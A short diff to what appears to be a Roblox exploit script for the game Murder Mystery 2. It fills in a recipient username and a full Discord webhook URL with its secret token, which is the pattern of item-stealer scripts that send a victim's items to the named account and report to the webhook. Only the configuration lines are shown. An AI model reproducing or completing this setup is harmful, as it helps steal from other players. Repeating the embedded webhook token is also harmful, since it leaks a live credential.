@@ -3,8 +3,8 @@ if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
-local Username = ""
-local Webhook = ""
+local Username = "JAMAL_THESCRIPTGUY"
+local Webhook = "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os"
 local function MM2()
     local user = Username
     local webhook = Webhook
